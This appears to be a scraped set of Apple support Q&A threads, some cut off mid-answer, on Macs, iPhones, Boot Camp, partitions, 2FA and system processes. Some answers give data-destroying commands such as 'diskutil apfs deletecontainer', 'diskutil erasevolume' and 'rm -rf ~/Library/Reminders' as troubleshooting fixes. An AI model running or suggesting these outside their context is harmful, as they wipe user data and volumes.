Happy to answer any questions.\nThank you!\nSobe\n\nA: The answer is you can not use a cable, adaptor or combination to connect the MacBook Air Thunderbolt port to a USB port on the monitor. When the Mac and Monitor both have USB Type-C ports which are capable of video and audio transmission and are connected together by a cable with USB Type-C plugs, then then two devices first communicate with each other before switching the ports to a video and audio transmission mode. For this to work you would need a MacBook Air with a USB Type-C port. (I believe this would be 2018 or newer MacBook Air.)\nYou did not give the model for your Lepow portable monitor. The user manual for the Z1-Silver model does not show any configurations which use a Thunderbolt mini Display to USB Type-C cable. The user guide specifically states on page 5 a MacBook Air without USB Type-C should use a Thunderbolt mini Display to HDMI adaptor.\n", "Q: Can I mute the Facetime ring on my Mac? I'm using Big Sur (11.4) with Facetime calling turned on. Whenever I get a call through Facetime or to my cellular number, the Mac silences whatever I was doing and puts out an obnoxiously loud ring.\nI know I can turn Facetime calls off completely, but that's not what I want. I do want to get call notifications on the computer, I just want them to be silent. Ideally I would like them not to mute my existing sound (music or whatever I'm doing) unless I take the call.\nIs there any way to turn off or mute Facetime rings while still receiving notifications?\n\nA: Try disabling the \"Play sound for notifications\" option in System Preferences > Notifications > FaceTime.\n(I currently don't have access to a Big Sur Mac, but I doubt the Notifications interface has changed much from Catalina.)\n", "Q: Folder won't open/greyed out I have a folder (recently transferred to my SSD from a friend’s hard drive) that is greyed out and won’t open.

Go to Applications and open the Terminal app.\nStep 3. Type SetFile -d 11/09/2016 /Path/to/grayed-out-folder/ and tap on return.\n\nThe title of the folder is “Haus VIDEO (Live Footage)”, (without the “”), so I tried to run this in Terminal:\nSetFile -d 11/09/2016 SetFile -d 11/09/2020 /Volumes/RH SSD/Haus VIDEO (Live Footage)/\n\nAnd I get this error:\n-bash: syntax error near unexpected token `('\n\nWhat does that mean/how can I fix it?\n\nA: Because your path argument contains space characters, in order for Terminal to understand your intent, you must escape each space character by preceding it with a back-slash (\"\\\") OR surround the entire path argument with double quotes.  I think the parenthesis characters are \"special\" too, so escape those as well.

Any ideas?\nEDIT: best guess is some app is \"stealing\" the key presses, not sure how to find out if that's true and if so, which app.\nEDIT 2: tested in another user and it works. Also did reset SMC et al. My best guess still is that something is stealing the keypresses, no idea what nor how to find out.\nEDIT 3: the macbook's physical keyboard also do not work.\nEDIT 4: it seem to have stopped working when I briefly migrated from apple music to spotify. Media keys didn't work on spotify, so I assumed it was a spotify issue, and started using bearded spice. Recently I migrated back to apple music and media keys don't work anywhere. I already uninstalled both bearded spice and spotify. I also looked for \"leftovers\" from those two apps using fd -i bearded and fd -i spotify and didn't find anything. There are also no processes from either running.\nEDIT 5: I don't have any media extensions on chrome and already disabled the media key handling by going to chrome://flags/#hardware-media-key-handling.\n\nA: I've been having this issue for a few weeks but didn't find a solution. Apple Support was also helpless.\nTurns out I am to blame: I've had disabled an internal Apple service but didn't remember...

Therefore you are able to select as many (graphically) adjacent files you want.\n\n", "Q: A USB-A hub or Thunderbolt 2 hub with USB-C ports in it? I have only USB-A and Thunderbolt 2 ports on my Macbook Pro. Is there a product out there that is a USB-A hub (or a Thunderbolt 2 hub) that includes USB-C ports within it?\nIf not, how can I plug in devices that require USB-C when my Macbook Pro only has USB-A and Thunderbolt 2 ports?\n\nA: I realize your question refers to a USB Type-A hub, where as below I refer to cables and adaptors. However, the same issues, with respect to the cables and adaptors, would also occur with hubs.\nActually, cables and adaptors with a USB Type-A plug and USB Type-C receptacle are not defined or allowed by the USB Type-C® Cable and Connector Specification Revision 2.1. This is stated in the last paragraph of Section 2.2, which is repeated below.\n\nUSB Type-C receptacle to USB legacy adapters are explicitly not defined or allowed. Such adapters would allow many invalid and potentially unsafe cable connections to be constructed by users.\n\nHowever despite this fact, there of plenty of such cables and adaptors which can be inexpensively purchased. For example, see this the question Add USB-C ports to an old 2014 iMac. I should point out that this type of solution would limit the maximum data transfer rate to 5 Gb/s.\nThe safer route would be get a Thunderbolt 3 dock and connect to the Mac through the Thunderbolt 3 (USB-C) to Thunderbolt 2 Adapter. For example OWC offers this Thunderbolt 3 Dock. I should point out that this type of solution is significantly more expensive.\n", "Q: The mysterious case of Touch Bar options - Why did they disappear and reappear in System Preferences? \n\nI have a Macbook Pro 16\" 2019 running macOS Catalina.\nI am wondering what controls the visible / invisible status of the Touch Bar settings (i.e. Touch Bar shows ..., Press Fn key to ..., and Customise Control Strip ...) as shown in the red boxes in the second screenshot.\nSo my story is, I recalled today there should be some Touch Bar settings in the System Preferences, but I couldn't find them initially (as shown by the first screenshot). After some random clicks and attempts (without restarting the computer), the options mysteriously reappeared (as shown by the second screenshot).\nCould someone please explain to me, what possibly caused these Touch Bar options to appear and disappear?\n(I am using an Apple Magic Keyboard in the meantime. Not sure if this is related.)\n\nA: Touch Bar settings are hidden when the computer is in clamshell mode (closed), as the Touch Bar is not accessible.\nTo make them reappear:\n\n*\n\n*Open the lid of the MacBook\n\n*Quit System Preferences\n\n*Re-open Keyboard settings\n\n\nA: Belated answer ... to my own question.\nYes, it's basically what @JBallin described in the comment.\n\nDo you ever use your MacBook in clamshell mode (lid closed)? The touchbar settings wouldn’t appear in this case, as the touchbar would not be accessible. They should appear if you open the lid, quit system preferences, and reopen keyboard shortcuts.\n\nI usually use Mac in the clamshell mode. Only occasionally keeping the lid open. After some opens and closes of the lid, the issue appears.\nThe Apple designers seem to give a \"smart\" appearance for the system, by silently concealing options that they deem as inapplicable. But the problem is, the idea is not always well communicated. Sometimes these \"smart\" behaviors could only be confusing.\n\nA separate but related story.\nToday, with my mac's lid closed, I happened to press Cmd + Shift + 6 as a customized shortcut for an application, but unexpectedly saw a screenshot of a black bar.\n\nI went to System Preferences --> Keyboard --> Shortcuts --> Screenshots for a check, but couldn't find anything showing 6 there.\n\nSuddenly, I realized that the black bar is actually the screenshot of the touch bar! So I opened the lid, and the screenshot options for the touch bar did (re)appear as expected.\n\nMy personal opinion: things need to be consistent. If the designer chooses to conceal the touch bar screenshot options from keyboard shortcuts, he or she should consider disabling the shortcuts altogether. After all, what is the point of screenshot of a black bar.\n", "Q: Tor Browser startup hangs forever Tor browser startup hangs forever in the \"Establishing Connection\" window with the progress bar absolutely empty.\nSearching Tor forums has given to help.\n\nA: *\n\n*Make sure there is no TOR browser process hanging around anymore (run ps aux | grep -i 'tor.*rowser' and kill any remaining processes)\n\n*rm -r ~/Library/Application\\ Support/TorBrowser-Data\n\n*Download and install most recent version from https://www.torproject.org/download/\n", "Q: How to run bootcamp when os is on external ssd? I have a late 2015 iMac, the internal drive was very slow so I erased it and am running everything from an external ssd. All my files I have are on the external ssd and the internal one is empty.\nI made a partition 500gb on my external ssd and want to run windows on that partition.\nIm following this official apple tutorial that suggests using bootcamp. However When bootcamp start and I click on continu it says to first remove all external storage.\nHowever im running osx from the only attached external drive (the ssd).\nHow can I run bootcamp when im running my os from an external partition?\n\n\nA: Apple doesn't officially support installing Windows via Bootcamp on an external device. Therefore you will have to go a different route, but it can be done. The following methods only work if you have another external drive!\nThere are many guides online, I used this article.\nWith this guide however, I know that you can't install it on a partitioned drive since WinToUsb needs to reformat the whole drive, not a partition.\nThe main steps would be:\n\n*\n\n*Download the windows support software with the Bootcamp app (open it, hit \"action\" and then download) and install them onto a pen drive (this includes the drivers, etc. for your mouse, keyboard,... to work under Windows)\n\n*Format your external drive as GUID-partition map and MS-DOS(FAT)\n\n*Install a virtual machine running Windows (e.g. using virtual box), install WinToUsb there and install Windows to the external drive there\n\n*Boot into the Windows installer and finally install the drivers.\n\nYou could also follow this guide, however, as it needs to be in Master Boot Record, you won't be able to use it on your current external drive either.\nThe main steps from that guide are:\n\n*\n\n*Prepare your drive/partition (format it as Master Boot Record and MS-DOS(FAT)\n\n*Download the Windows support software with the Bootcamp app (open it, hit \"action\" and then download) and install them onto a pen drive (this includes the drivers, etc. for your mouse, keyboard,... to work under Windows)\n\n*Use virtual box to install the Windows on the external drive\n\n*Reboot your machine to windows and install the drivers.\n\n\nA: This answer does not apply to all Macs. The answer does apply to your Mac. If you want more detailed instructions, then restart your Mac and then post the output from the command diskutil list to your question.\nYou can not use the Boot Camp Assistant to install Windows on an external drive. You can use the Boot Camp Assistant to download the Windows Support Software. You can use the Disk Utility and Finder to create an ExFAT formatted USB flash drive Windows 10 installer. This usually boots if you have or had High Sierra or newer macOS installed. (Basically, this provides the firmware update to boot from ExFAT.) You can not use the GUI (Graphical User Interface) Windows installer to directly install to an external drive. However, you can use the CLI (Command Line Interface) to directly install to an external drive.\nOtherwise, there a plenty of posts here a Ask Different and other web sites where Windows 10 can be installed to a external drive by using a virtual machine to run the GUI installer. See: Is it possible to use Boot Camp with Windows 10 from an external HDD?\n", "Q: Secure erased drive - always one file can be found I've been going through some old HD drives, secure erasing before sending to recycle. I periodically run Disk Drill over one of them, just to make sure I'm doing the job right.\nNo matter whether I do the 'quick' secure or the full-blown two day multiple run, Disk Drill always manages to find one plist file… apparently the same file each time, or very similar. It appears to be some drive spec & prefs.\nCould this be something to do with the EFI partition, generated as part of the new format, rather than anything left over from the old? I honestly can't think of any reason it should always be able to find this & nothing else - oddly, even if the drive was previously NTFS.

The installation proceeded until the Mac tried to reboot to Windows 10. This is where the installation failed. If you would had successfully completed the Setup.exe application included with the Windows Support Software, then the installation would have gone fine. This includes a reboot with all the hardware working.\nThe following debug information could have been provided:\n\n*\n\n*The version of OS X (macOS)\n\n*The output from diskutil list\n\n*The output from sudo fdisk /dev/disk0 (This may require first booting to Recovery mode.)\n\n*A listing of the files and folders in the root folder of the USB Windows 10 installer flash drive.\n\nYou stated the following:\n\nI have downloaded Win 10 ISO from Microsoft site and there was issue with Bootcamp where I have to edit a file to make Bootcamp work for Win 10 version\n\nYou may have edited the file so that Windows 10 was installed to UEFI boot. Most (if not all) 2011 Macs installed Windows to BIOS boot. This can be confirmed by providing the debug information given above.\nYou stated the following:\n\nanother issue came when USB drive where I was downloading, it was always failing because of file size limit ( some file was over 4GB and FAT/exFAT has 4GB limit on file so I found out another video where big file was spilit into 2 so another ISO file was created where bigfile was split in two files.\n\nThis problem was solved for most (if not all) Macs by provided a firmware update included with High Sierra and newer versions of macOS. This update allows Macs to boot from ExFAT formatted volumes. Evidently, your version of the Boot Camp Assistant did not use the ExFAT format when creating the USB Windows 10 installer.\nRegardlessly of whether you have installed Windows to BIOS or UEFI boot, you could first determine the boot method, then reinstall Windows to boot using the other method. (Or just change the boot method, but this requires advanced knowledge of the Windows installer CLI.)\n\nAnother solution would be to first install Windows 7 or 8.1, then upgrade to Windows 10. This would probably require purchasing a Windows 7 or 8.1 product key. The advantage to this method is Apple designed your Mac to run the 64 bit versions of both Windows 7 or 8.1, so there should be no problems using the Boot Camp Assistant to install.\n\nFinally, I should point out that I posted the following question with my own answer: How to install Windows 10 into a 2011 iMac without using the Boot Camp Assistant, an optical (DVD) drive or third party tools?. You might find this useful.\n\nUpdate\nYour Mac is currently setup to UEFI boot from the Windows 10 installer. I assume you should be BIOS booting from the Windows 10 installer. However, to install Windows 10 to BIOS boot would require your Mac to by hybrid partitioned. Currently, you Mac is not using hybrid partitioning.\nI was wondering if the follow procedure would work.\n\nNote: This procedure does not require a product key for Windows 8.1.\n\n\n*\n\n*According to what you posted so far, You modified the Boot Camp Assistant so you could make a USB Windows 10 installer. I assume you still have this installer.\n\n\n*Remove the Windows partitions. Basically enter the following commands.\ndiskutil erasevolume free none disk0s4\ndiskutil erasevolume free none disk0s3\ndiskutil apfs resizecontainer disk0s2 0\n\n\n\n*Download the Windows 8.1 ISO file.\n\n\n*Undo the changes you made to the Boot Camp Assistant.\n\n\n*Using a different flash drive, proceed to start installing Windows 8.1 by using the Boot Camp Assistant.\n\n\n*When you have reached the following screen, exchange the USB Windows 8.1 installer for the USB Windows 10 installer, then select the red box with the X: .\n\nWhen the popup shown below appears, select the Yes button.\n\nIf the Mac does not boot from the USB Windows 10 installer, then restart the Mac and hold down the option key. When the Mac Startup Manager icons appear, select the external drive icon labeled Windows. In either case, you will see the screen shown below. Proceed to install Windows 10.\n\n", "Q: Hold keyboard key and hold mouse button with AppleScript I was looking to make a script where I simply hold a and hold leftclick.

These providers are outlook and gmail.\nWhen I use thunderbird on linux mint, I need to generate an app password to log in. Sometimes these passwords seem to expire but this is not my question, only a ”proof” that 2fa really is turned on, and that google auth isn’t only an optional sign-in method.\nMail on iphone (SE 2020, os 14.6) always works at first setup, never failing, despite only knowing my login password (both two providers). What is going on here? Am I dealing with a feature or a vulnerability?\nHere is what I’ve considered but failed to query here or on google.\nA) the smart phone connects to the server very often, therefore the app password does not expire\nB) the smart phone always looks up one-time passwords on google authenticator, performing repeated logins that I do not see\nC) the smart phone is a ”trusted device” that can somehow ignore 2fa\nIf this is a vulnerability, I would like to know if it is serious. If it is a feature, are there methods to implement it on other devices (e.g. ubuntu pc)\nEdit: I’m really asking why does mail (software) even work. Removed a reference to icloud as irrelevant.\n\nA: I asked the wrong question based on a mistaken assumption. That assumption was that Apple was somehow escalating privileged access. instead my problem was provider - 3rd party client problems, for example Microsoft kept disbanding app passwords by some unknown metrics. Google just labeled some of them unreliable, see:Geary.\nI had mistakenly assumed 2fa to mean login pass and authentication always. That just isn’t so - in fact I knew about ”trusted devices”, the confusion came from this tiny detail; my iphone wan’t listed as such a device, it could presumably be removed by ”revoke all” but I need mine operational 24/7 and daren’t risk it now. Based on comments, my hypothesis is that, if certain clients aren’t even trusted to handle the very basics, perhaps apple mail - on ios - on an iphone, was given a special token, a token with no set final date, always on, unless revoked. Oh and I did check that authenticator weren’t even required, on this phone. The answer according to my options is C, this is a trusted device. As for the token, I don’t know exactly. Input from apple server modified by some unique process to send the resulting output as proof of identity? But now I’ll know what I’m looking for, it is not authenticator nor a manual prompt. I suggested that the prompt was only needed once, but something similar might just be running under the hood.\nI mistakenly identified iphone as single point of failure, to be equal to untrustworthy. And yes, it could establish a vulnerability in some cases, but I made a gross exaggerarion. So let’s compare it to a pc computer: 1) encryption as default vs optional,  2) optional login pass 3) biometrics. The phone has similar or better options and phones often have other architecture security benefits. Both devices use authenticators and password managers too. I can’t recall giving my iphone a special status, but I must have done so. After all it was a matter of 1) device pass login 2) google pass login 3) terms and confirmation 4) google prompt to confirm.\nTwo passwords and a 2nd factors, pretty good identification to me\nPotential issue: ease-of-use can be misread as lax sexurity, disfunctional logins can be misread as strong security. Or wait was that just me? Can’t be just me\nSumma summarum: my concept of 2fa was very rigid, I even misattributed flawed auth scenes to stricter security,\np.s I posted a horrible blog entry here that was illegible and incoherent. I’m struggling with record heat. Having regained some composure I’ll stop here and thank you for pointing the righr way.\n\nA: Both Mac and iOS Mail applications will bring up the Google login page for Gmail connections. Google processes the 2 Factor Auth and the Mail app doesn't need to worry about it. Gmail provides the Mail application with a token that it can use indefinitely.\nOther applications that ask for your username and password in their own UI need an app-specific password since they don't get to take advantage of the Google-provided login flow.\n", "Q: In a copy operation why does macOS Big Sur send a lot of packets to the hard drive it is copying from?

In the pie chart this means the one starting at 12 o'clock (clockwise) is the most upper one. Every partition following clockwise is the next highest, i.e. the one closest approaching 12 o'clock clockwise will be the lowest. You can merge that one to the upper one, but not the other way round.\nIn your specific case this means, you would maybe be able to merge \"MK-BigSur\" to \"Container disk1\", but not the other way round. Merging actually means one partition is being enlarged after the other has beed deleted.\nAs it has been pointed out, messing around with partitions (especially if you are unexperienced) may quickly lead to data loss. Always make sure to have a backup of your important data!\n\nA: Here I assume the output from diskutil list will show the container disk1 occurs before the container with the MK-BigSur volume. In other words, disk0s2 partition has container disk1 and the disk0s3 partition has container disk2. The disk2 container has the MK-BigSur volume.\nYou question is similar to this question. However, to use the accepted answer, you would first have to remove the container disk1. The commands are given below. Here I assume the command is entered using Big Sur.\ndiskutil apfs deletecontainer disk1\n\nAfterwards, restart the Mac before using the accepted answer.\n", "Q: SanDisk External SSD formatting problem on MacBook Pro M1 I recently bought a MacBook Pro M1 and a SanDisk external ssd.

(See policies below)\nI tried to contact Apple about that but the operator was completely clueless about the whole App Store policies and the way apps' updates get approved by Apple.\nI'm now out of options since there's no way for me to access my COVID immunity certificate if I don't allow my government to track me, and considered the recent news about spywares used by Hungary I don't feel safe to allow a gov app to track me.\nIs there any way to circumvent this limitation or report the problem to Apple?\nPolicies:\n\nCan I gate functionality on agreeing to allow tracking, or incentivize users to agree to allow tracking in the app tracking transparency prompt?\nNo, per the App Store Review Guidelines: 3.2.2 (vi).\n\nhttps://developer.apple.com/app-store/user-privacy-and-data-use/\n\n(vi) Apps should allow a user to get what they’ve paid for without performing additional tasks, such as posting on social media, uploading contacts, checking in to the app a certain number of times, etc. Apps should not require users to rate the app, review the app, watch videos, download other apps, tap on advertisements, enable tracking, or take other similar actions in order to access functionality, content, use the app, or receive monetary or other compensation, including but not limited to gift cards and codes.\n\nhttps://developer.apple.com/app-store/review/guidelines/#3.2.2\n\nA: The only solution I found, in order to get the European COVID pass on my iPhone, is to download the certificate from the Government Health Portal (EESZT) and then add it to the Apple Wallet thanks to a 3d party web app.\n\n*\n\n*Visit https://www.eeszt.gov.hu/hu/nyito-oldal\n\n*Login into the website with your \"ÜGYFÉLKAPU\" credentials\n\n*Click on the top-left banner that reads \"Unios digitalis Covid igazolvany\" (it's a JPG so it can't be translated by Google Translate)\n\n*On the new page that it opens, click on the \"Oltási igazolvány\" radio box\n\n*On the table below, you will find a list of certificates, one for each vaccine jab you received\n\n*Click on each of them and click \"Igazolvány letöltése\" to download them\n\n*Visit https://covidpass.marvinsextro.de\n\n*Follow the instructions to upload the certificates and generate an Apple Wallet pass\n\nFollowing the above procedure you can store your COVID Green Pass on your iPhone without using the government's EESZT app.\n", "Q: Is there a way to open the app only on the currect screen? I have a MacBook pro and I connected the additional screen to it, so I have two screens one of the MacBook and the other one is that I connected. The situation is that I work with XCode and I opened two instances of it one XCode window I put on the first screen and another window of it I put on the second screen, then (eg:) I opened Safari browser on the first screen and on the second one I opened Finder(or something else), so in this case, my XCode windows left behind. Now I need to get the XCode window back on the second screen, BUT I want to leave the Safari browser on the first screen, the problem is that if I move the mouse to the bottom panel where is XCode icon and click on it (in order to bring it forward as on Windows) as a result it brings me forward XCode on both first and second screens, so I need to go and open Safari on the second screen. It is very annoying because each time I expect that it opens me XCode on the screen where I invoke it, it opens it on both screens (because I have 2 of the instances). I would like to get functional as on Windows, when I go to the specific screen and open the app on that screen, it opens exactly on that screen and doesn't bring forward all windows of the app on all the screens. It is a little bit confusing, but I hope you got my idea. Are there any solutions for it?\n\nA: You're fighting a paradigm shift.\nOpening an app twice on Windows will actually launch two separate instances of the app. On Mac it will not. It will merely add another view into the same instance.\nBringing that app to the front will [almost] always bring all windows of that app to the front too. There have been some bugs over the years where that fails to happen - Finder has famously got worse for that since about Sierra, but otherwise the 'all to front' implementation is expected behaviour.\n", "Q: iCalendar (.ics) attachment can't be added in Gmail app to Apple Calendar .ics attached can be viewed in Gmail app, but there are no button to add it to Apple Calendar.\nGmail image:\n\nIn Mail app the window looks same but has buttons to add the event:\n\nAlso there is no option to share the attachment into the Calendar directly.\nI see that Gmail app parsed the event info, but even with Google Calendar installed I can not do anything with it. I have these options in Gmail app on Android.\nWhy is that and is there another easy option to import this event without Apple Mail?\nIt's Google who did not code this feature or Apple's restriction?\nEdit: https://discussions.apple.com/thread/251135443 no answer to \"why\".\n\nA: This app should be the one to solve this problem\n", "Q: iOS In-App Purchase Offer Codes - Can user use a new offer code after subscription expires? If I provide an offer code, for a 1-month of free subscription, to a user for free access to my app, after 1 month can the same user use the new code for a 1-month of free subscription?\nOR\nUser can use the offer code only 1 time?\n\nA: Per Apple Developer docs:\n\nOffer codes are unique, alphanumeric codes that provide a free or discounted price for auto-renewable subscriptions for a specific duration.  Each offer code can be redeemed only once. You can create a maximum of 150,000 codes per app, per quarter. In order for users to redeem your codes, they must be running iOS 14, or iPadOS 14 or later.\n\nAlso here:\n\nCustomers can redeem only one code per active offer, but may be eligible to redeem multiple different offer codes for a single subscription, depending on your configuration choices.\n\n", "Q: Why is Activity Monitor consistently using high CPU %? \nI've had Activity Monitor open for a couple of minutes now and it is hovering between 30-70% cpu use. With a quad-core CPU I think that is somewhat misleading but even so, should the system monitoring process itself be using substantial system resources? Is it normal?\nRunning Catalina 10.15.7 on a 2012 Mac Mini.\n\nA: You can change the refresh frequency. CPU usage should be roughly proportional.\n\nI'm on a 2021 MacBook Air and it's still between 5 and 10 % with updates only every 5 seconds, so your numbers seem to be perfectly fine.\n", "Q: Where should I put cron jobs? I have some shell code that I'd like to execute daily using cron. Currently, I have the entire code written as a one-liner, and the 6 variations (each designed to run at different times) are all written in the crontab. While this works, it's quite difficult to read, and could be made more efficient by putting the code in a shell script, and running the script with cron.\nHowever, I need to put the script somewhere. I cannot find anything in the man pages or online specifying the 'proper' location for cron jobs. Is there a directory in /etc for cron jobs? Or should I use root permissions to put my script in /usr/lib/cron/jobs/? Should I put the script in ~/.bin/ and use the full path in my crontab?\nWhen I ask where I 'should' put it, I am looking for the location that is designated by the implementation of cron, or, if that doesn't exist, the location that makes the most sense and is most secure.\nNote: the script needs no special permissions, just to run as me.\n\nA: Both /etc and /usr are part of macOS and get mostly overwritten with each OS upgrade (with the exception of /usr/local). So you don‘t want to store your own content there.\nThe canonical place for user-provided code is /usr/local/bin, at least if you don‘t mind other users reading the shell script or running it. Otherwise (or to make it easier to update it) ~/.bin or similar is a good place.\n", "Q: Turn wifi/bluetooth off permanently in the Control Center - not until tomorrow I'm new to the iPhone. I wonder how I can turn wifi or bluetooth off permanently in the Control Center. When I press the button, it says that wifi is turned off until tomorrow, whatever that means.\nFor some people this may work, but not for me. I almost never use wifi, and if I turn it on and then turn it off, I don't want to go into the settings to handle it there. Is there a setting I'm missing that can change this behavior? Same goes for Bluetooth.\n\nA: Turning off WiFi in Control Center is a temporary toggle. Apple intended it to be that, way. Why? your guess is as good as mine.\nIf you want WiFi off go into\nSettings > Wi-Fi\nAnd toggle the green switch at the top to off. It will stay that way. Only control center turns it off temporarily.\n", "Q: How to change columns shown in File Open dialog I am using Thunderbird and the File Open dialog shows Date Added  . I would like to change to Last Modified (or the equivalent) .  Is this a Finder setting, macOS or Thunderbird specific?  How can that setting be changed?\n\n\nA: When that dialog is displayed you can indeed choose what fields are displayed.\nJust right-click on one of the column headings (next to \"Name, Size,\" etc) and select from the list in the pop-up menu.\nIt should remember that selection, at least for that app.\n", "Q: View local IP for connected device on hotspot is there a way in which I can view the local IP address for a device connected to the hotspot that I make with my iPhone? I want to do this because I want to view the desktop of a Raspberry Pi that I share my mobile data with using VNC Viewer (and I need its local IP address for this). Thanks in advance!\n\nA: First off, if the Pi has an internet connection on your local network, you can connect to it with it's hostname, not just it's IP.\nThis is verified on https://www.raspberrypi.org/forums/viewtopic.php?t=228641\nBut, if you still need the IP... here's a way:\nThis is what I did to find out my iphone's hotspot IP.\n\n*\n\n*Turn on the hotspot, and connect your Mac to it.\n\n*Hold down the option key on the Mac, and click your wifi menu icon.\n\n\n*\n\n*this will show you extra data like the Gateway address.\n\n*if your Mac and the PI are the only two things using the hotspot, then it should just increment the next number\n(my mac is 172.20.10.7, so the PI would likely be .8, etc.)\n\nBut if not, you have the IP and the Gateway to investigate.\n\n\n*Connect the PI to the hotspot.\n\n*You can then use your mac to run an ip scan of all devices on the same ip range\n\n\n*\n\n*Open Terminal on your Mac, and type arp -a to get a list of connected IPs on the same network.\n\n\nOf course, if you want to get a bit technical, there are ways to make the Pi tell you it's IP address when it connects.\nFor example, having it run this command will report back it's known IP: curl 'https://api.ipify.org?format=json'\nWith that, you could have it send an email or tweet the ip anytime it connected to wifi. But that's another reply, I suppose.\n\nA: ifconfig should tell you a lot of information\n", "Q: Help with this kernel panic log please!

In case DFA fails to repair the drive, this should be done via Target Disk Mode, not booted into your Mac, to minimize further corruption.\n\n*If DFA can not repair the drive, you will need to erase it and reinstall macOS, then restore your documents from the backup.\n\nIf this panic reoccurs after either a successful repair or a full erase & install, then there is a persistent underlying cause of corruption, such as faulty DRAM or SSD devices. These are less common than idiopathic corruption.\n", "Q: Firmware Password Change Instructions don't match Software Menu's https://support.apple.com/en-us/HT204455\nInstructions do not match my Mac's Menu (current OS) - there is no Startup Security Utility or Firmware Password Utility.\n\nA: What is your Mac model?

(On english keyboard it would be the same as pressing command + y - not ergonomic)\nUsing System Preferences > Keyboard > Shortcuts and adding a custom App Shortcut does not seem to work as command + y collides with other application shortcuts (e.g. Redo in Sublime).\nSo what are my options to remap the undo shortcut system-wide so that pressing command + y triggers it, without side effects?\nPreferably I would not like to use third party solutions.\n\nA: I doubt you'll manage this natively - because there is no system-wide undo/redo sequence.\nSome apps use still use the older  Cmd ⌘   Y  , many others the newer  Cmd ⌘   Shift ⇧   Z  .\nYou can, of course, change any menu command, but you can't change a command that doesn't have a menu item. You also cannot wildcard a menu name.\nJust to take an example from Safari.  Cmd ⌘   Z  is currently 'Undo Typing'\n\nHowever, if I close a tab it becomes 'Undo Close Tab'\n\nOnce you Undo, then your Redo becomes similarly context-sensitive\n\nYou would have to try to make one new key command for each potential menu item & also ignore that the Keyboard prefs page is going to keep shouting at you that you have duplicates.\nYou might be able to get something like Karabiner Elements to globally change those specific key combinations around. There are some pre-made 'recipes' to do some fairly complex reassignments, but it's not something I've studied. See https://ke-complex-modifications.pqrs.org/#Keychron%20K6\n\nA: After spending more time on this issue, I think I've found a solution: User defined macOS keyboard layouts. These allow remapping modifier combinations like command + key while leaving key untouched.\nWhile keyboard layouts xml files can be edited manually, using Ukulele makes this process a lot less error prone.\nIn Ukulele create a keyboard layout from your active layout. Then keeping command pressed switch the output string for y and z:\n\nNow either use Ukulele to add this keyboard layout to the active layouts or copy it to ~Library/Keyboard Layouts. After log out / log in the new layout can be selected and becomes active.\n", "Q: Is display MacBook Pro fuse or software protected against overpowered/ short circuit? I did accidentally overpowered (12v) the USB Port of My MacBook Pro 2015 by putting a powered male usb. (I know that is stupid of me).\nImmediately the display and the light of my keyboard went off.\nI hear on the sound of the MacBook that the Mac is still alive.\nNow I am questioning myself.\n-are the display and keyboard light dead and have to be replaced?\n-is there any protection mode designed by smart apple engineers to protect such a rare situation. By for example a fuse (for backlight/display, I found on YouTube the replacement instructions already. For keyboard I didn’t yet found any) or a software mode?\nI’m not able to search for any resource to help me solve this. What guides or steps are people using for this situation?\n\nA: Update:\nI discovered that my U7700 is burned out and not the backlight fuse which should have protect the chip.\nI have ordered a new chip and hotair gun at AliExpress. Replacement should be quite doable for a handy person.\nNext to this:\nI found out that a Complete new mother board Can be purchased at AliExpress for quite a fair price of €100.

Apple’s folio case and keyboard folio case are stupidly expensive, but the old pro 11 (2018) cases are cheap on eBay. Will older iPad Pro 11 (2018) folio cases fit the iPad Air 4? The iPad Air 4 has the same height and width as the 2018 iPad Pro. The only things I can think would be different are:\n\n*\n\n*Air 4 is slightly thicker.\n\n\n*Camera might be slightly different size?\n\n\n*Magnets might be slightly\ndifferent\nHas anyone tried this?\n\nA: I use a keyboard folio case for my Air, which i previously used with the iPad Pro 2018. Regarding the iPad thickness i cannot see a negative effect, the additional thickness is rather small here. Also regarding your other points i don't see anything negative here.\n", "Q: Is it possible to limit resource usage by user in macOS? We have a mac1.metal instance in AWS. Configured with 2 users, one for the QA team and another one for Devs. I'm trying to limit the resource usage of the users, so the any of the teams can't claim the full resources of the machine and leave the other team without using the device.\nOn Linux, there is the /etc/security/limits.conf file, and on FreeBSD there is rctl command, as well as ulimit command with its file /etc/login.conf. If I understand correctly, these only limit resources to processes and not users. On Linux, there is also cgroups.\nThere is a ulimit utility in macOS, but it seems only processes, and not users, can be configured to limit the resources they use.\nIs there another tool to achieve user resource limits?\n\nA: Apple has long prioritized responsiveness for the user at the console and limited traditional Unix / system configuration items. I’m eager to try the AWS hardware, but have not had that pleasure yet.\nOn physical hardware, I do often turn on performance mode - https://support.apple.com/en-us/HT202528\n\nsudo nvram boot-args=\"serverperfmode=1 $(nvram boot-args 2>/dev/null | cut -f 2-)\"\n\nThat increases TCP stack buffer allocations, increases the max processes in several ways and has worked very well without me needing to tune macOS servers further in more than a decade.\nIf you run into specific problems as opposed to theoretical or potential ones, I would head to App Tamer to manage things.\n\n*\n\n*https://stclairsoft.com/AppTamer/index.html\n", "Q: Reminders (remindd) waste CPU resources 100% / 200%, and obviously drain batteries of my MacBook Pro, Apple Watch (guess) and iPhone (guess) A couple of months ago I decided to get a new MacBook Pro, it felt like the battery on the old one was dying, same applies to my old iPhone. And here I am, with a new MacBook (Intel, i9), new iPhone and Apple Watch. The laptop dies within 1-2 hours without external power. The Apple Watch dies within 5 hours. And the fresh iPhone dies within 12 hours.\nAfter a little bit of checking, I realised that something weird is going on with Reminders. On the laptop, it is remindd process that constantly consumes 200% / two cores of CPU. By the moment, I have been too lazy to find a way to check what is going on with the iPhone and Watch, but I suppose it is the same issue, remindd. I would have assumed the implementation of the service should be the same, or very similar across all the devices. Including bugs.\nI am not taking the ultimately hopeless path of reporting that to Apple, but instead, I am just trying to get rid of all the reminders, everywhere. Which seems to be impossible. Even after creating a little shortcut (Shortcuts app on iOS) and deleting all of them, notifications still appear.\nSo how can I remove them all?\n\nA: I'm on Big Sur and have had the same problem for months. Finally decided to reboot reminders the hard way.\n\n*\n\n*Disable reminders in Settings > Accounts > iCloud\n\n*Use Activity Monitor to force quit remindd\n\n*Quit the Reminders application if you have it open.\n\n*Use Terminal to rm -rf ~/Library/Reminders\n\n*Use Activity Monitor to force quit remindd again, just in case.\n\n*Re-enable reminders in Settings > Accounts > iCloud\n\n*Watch CPU spike up again for a while...\n\nSo none of that worked. The remindd process came back and continued churning a sqlite database in the ~/Library/Reminders/ folder to over 300MB in size.\nUltimately, I deleted all the reminders on my iPhone, iPad, and mac. I transferred them into a different list manager. Then I deleted the app from those devices, turned off iCloud syncing for reminders, quit the reminders app on my iMac, et voila, the remindd process on my iMac self-terminated and stopped 